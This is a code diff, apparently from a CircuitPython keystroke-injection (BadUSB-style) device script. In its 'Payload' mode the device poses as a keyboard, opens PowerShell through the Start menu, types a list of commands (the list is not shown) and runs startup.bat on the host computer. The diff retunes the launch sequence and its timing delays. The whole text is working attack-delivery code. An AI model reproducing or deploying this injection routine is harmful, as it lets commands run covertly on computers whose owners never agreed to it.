@@ -65,11 +65,12 @@ elif mode == "False":
     #end loop here
     while True: led.value = True #FEEDBACK FINISHED
 elif mode == "Payload":
-    time.sleep(1)
-    kbd.send(Keycode.WINDOWS,Keycode.R)
-    time.sleep(0.125)
-    layout.write('powershell\n')
-    time.sleep(1)
+    time.sleep(1.25)
+    kbd.send(Keycode.WINDOWS)
+    layout.write('powersh')
+    time.sleep(0.25)
+    kbd.send(Keycode.ENTER)
+    time.sleep(0.85)
     layout.write(f'{";".join(lst)}\n./startup.bat\n')
 else:
     print("Not Accepted Mode")
